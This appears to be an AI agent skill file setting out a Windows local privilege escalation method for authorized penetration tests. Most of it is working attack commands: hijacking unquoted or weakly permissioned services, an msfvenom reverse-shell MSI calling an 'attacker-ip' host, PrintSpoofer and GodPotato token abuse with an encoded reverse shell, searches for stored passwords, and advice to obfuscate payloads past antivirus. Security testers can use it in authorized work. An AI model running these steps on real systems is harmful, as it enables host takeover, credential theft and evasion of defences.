---
name: windows-privesc
description: >
  Windows local privilege escalation methodology for authorized
  engagements on a single compromised host: service misconfiguration,
  unquoted service paths, AlwaysInstallElevated, token impersonation
  (Potato family). Keywords: Windows privesc, unquoted path,
  AlwaysInstallElevated, token impersonation, JuicyPotato, PrintSpoofer,
  winPEAS, service permissions. Do NOT use for domain-level attacks like
  Kerberoasting or DCSync (see active-directory), or for Linux hosts
  (see linux-privesc).
metadata:
  type: platform
  phase: hunting
  tools: [winpeas, powerup, accesschk, printspoofer, godpotato, seatbelt]
depends_on: []
feeds_into: [chain-analysis, privesc-report, active-directory]
chains_with: [active-directory, network-infra]
---

## Signals
- Low-privilege shell (web shell, RDP, reverse shell) on a Windows host.
- `whoami /priv` shows `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, or `SeBackupPrivilege` enabled.
- Services running as SYSTEM with weak file/registry permissions on their binary path.

## Prerequisites
- Written authorization covering the specific host.
- Any local shell (even low-privileged), or physical/RDP access with a low-priv account.
- `winPEAS`, `PowerUp.ps1`, `accesschk.exe`, `PrintSpoofer`/`GodPotato` (post-JuicyPotato successors — JuicyPotato itself is patched on modern builds), `Seatbelt`.

## Methodology

### 1. Automated enumeration first
```powershell
# winPEAS (fastest broad sweep)
.\winPEASx64.exe
# PowerUp for service/registry/scheduled-task misconfig specifically
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
# Seatbelt for host survey (patches, AV, creds in files)
.\Seatbelt.exe -group=all
```

### 2. Unquoted service path
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"
# If a service runs: C:\Program Files\Vulnerable App\service.exe and is unquoted,
# Windows tries C:\Program.exe, then C:\Program Files\Vulnerable.exe, etc.
# Check write access to each candidate directory
accesschk.exe -uwdq "C:\Program Files\Vulnerable App\"
# If writable, drop a malicious binary at the earliest resolved path and restart the service
copy payload.exe "C:\Program.exe"
sc stop VulnSvc & sc start VulnSvc
```

### 3. Weak service binary/registry permissions
```powershell
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv VulnSvc
# If WRITE DAC/WRITE allowed on the service itself (SERVICE_ALL_ACCESS to a low-priv group)
sc config VulnSvc binpath= "C:\payload.exe"
sc stop VulnSvc & sc start VulnSvc
```

### 4. AlwaysInstallElevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both are 1, build a malicious MSI and run it
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f msi -o payload.msi
msiexec /quiet /qn /i payload.msi
```

### 5. Token impersonation (SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege)
```powershell
whoami /priv | findstr /i "Impersonate\|AssignPrimary"
# PrintSpoofer (works on most patched Windows 10/Server 2019+ where JuicyPotato is dead)
PrintSpoofer.exe -i -c "cmd /c whoami"
PrintSpoofer.exe -i -c "powershell -enc <base64-revshell>"
# GodPotato as the current generation alternative
GodPotato.exe -cmd "cmd /c whoami"
```

### 6. Scheduled task / startup abuse
```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName\|Run As User\|Task To Run"
accesschk.exe -dqv "C:\path\to\task\binary.exe"
```

### 7. Stored credentials / unattended install files
```powershell
findstr /si password *.txt *.ini *.xml *.config 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

## Tooling
`winPEAS`, `PowerUp.ps1`, `accesschk.exe` (Sysinternals), `PrintSpoofer`, `GodPotato`, `Seatbelt`, `mimikatz` (credential dump post-privesc), `msfvenom`.

## Validation Gate
- Every privesc path must be demonstrated by actually obtaining a SYSTEM/admin shell (`whoami` output showing the elevated principal), not just "the misconfiguration exists."
- Service restarts performed as part of a PoC are a stateful/potentially disruptive action on a live host — confirm the service isn't production-critical, and prefer a reversible test (restore original binpath after confirming).
- Record exact `accesschk`/`sc`/`reg` output used to identify the vector.

## Gotchas
- Restarting a Windows service on a production host (even your own test target) can cause downtime of whatever depends on it — treat as the "acciones que modifiquen estado del target" human gate.
- JuicyPotato is patched on Windows builds after a certain CLSID hardening update — don't waste time on it against modern Server 2019+/Windows 10 1809+; go straight to PrintSpoofer/GodPotato.
- `AlwaysInstallElevated` both HKLM and HKCU must be 1 — checking only one key gives a false negative.
- AV/EDR on the host will likely flag `mimikatz.exe` and raw `msfvenom` payloads — expect to need obfuscation or in-memory execution, and note detection behavior as a finding in its own right.
